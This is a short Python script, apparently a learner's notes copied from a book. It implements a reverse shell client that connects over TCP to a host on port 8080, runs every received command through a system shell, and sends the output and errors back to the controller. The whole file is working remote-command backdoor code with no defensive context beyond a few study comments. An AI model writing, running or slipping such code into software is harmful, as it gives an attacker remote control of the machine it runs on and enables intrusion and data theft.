# this I got from book, need to be revisit

import socket

# explain this more 
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = socket.gethostbyname(socket.gethostname())
port = 8080
s.connect((ip, port))

while True:
    command = s.recv(1024)


    # we pass the received command to a shell process
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    s.send(CMD.stdout.read()) # send back the result
    s.send(CMD.stderr.read()) # send back error-if any